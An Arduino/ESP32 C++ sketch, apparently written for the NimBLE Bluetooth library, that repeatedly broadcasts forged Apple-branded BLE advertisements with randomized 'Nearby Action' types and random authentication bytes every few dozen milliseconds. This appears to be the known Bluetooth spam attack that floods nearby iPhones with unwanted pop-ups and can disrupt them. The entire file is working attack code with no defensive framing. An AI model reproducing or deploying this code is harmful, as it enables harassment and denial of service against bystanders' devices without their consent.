#include <NimBLEDevice.h>

NimBLEAdvertising *pAdvertising;

void setup() {
  NimBLEDevice::init("");

  NimBLEServer *pServer = NimBLEDevice::createServer(); // Starting BLE Server

  pAdvertising = NimBLEDevice::getAdvertising();
  // Removed setting advertisement type, using default
}

NimBLEAdvertisementData getOAdvertisementData() {
  NimBLEAdvertisementData randomAdvertisementData;
  uint8_t packet[17];
  uint8_t size = 17;
  uint8_t i = 0;

  packet[i++] = size - 1;    // Packet Length
  packet[i++] = 0xFF;        // Packet Type (Manufacturer Specific)
  packet[i++] = 0x4C;        // Packet Company ID (Apple, Inc.)
  packet[i++] = 0x00;        // ...
  packet[i++] = 0x0F;  // Type
  packet[i++] = 0x05;                        // Length
  packet[i++] = 0xC1;                        // Action Flags
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];  // Action Type
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;   // Authentication Tag
  packet[i++] = 0x00;  // ???
  packet[i++] = 0x00;  // ???
  packet[i++] =  0x10;  // Type ???
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;

  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
  delay(45);
  
  NimBLEAdvertisementData advertisementData = getOAdvertisementData(); // Making random packet
  pAdvertising->setAdvertisementData(advertisementData); // Setting random packet
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
